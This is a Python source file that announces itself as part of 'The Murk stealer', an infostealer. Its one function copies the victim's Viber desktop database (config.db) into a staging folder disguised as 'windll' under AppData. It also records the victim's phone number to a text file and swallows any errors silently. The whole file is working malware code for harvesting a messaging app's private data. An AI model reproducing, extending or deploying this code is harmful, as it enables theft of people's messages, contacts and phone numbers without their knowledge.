#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
import shutil
path = r'ViberPC\config.db'
path1 = r'ViberPC'

def Viber():
        try :   
            pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
            os.makedirs(rf'{pathtofile}\windll\Viber')
            user = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
            shutil.copy2(user+ os.sep + path,rf'{pathtofile}\windll\Viber')# copy data
            dirs = os.listdir(f"{user+os.sep+path1}")# get phone number
            for filename in dirs:
                if (filename.isdigit()):
                    with open(rf"{pathtofile}\windll\Viber\phoneNumber.txt", "a", encoding="utf-8") as num:# write phone number
                        num.write("+"+filename)
                    num.close()
        except:
            pass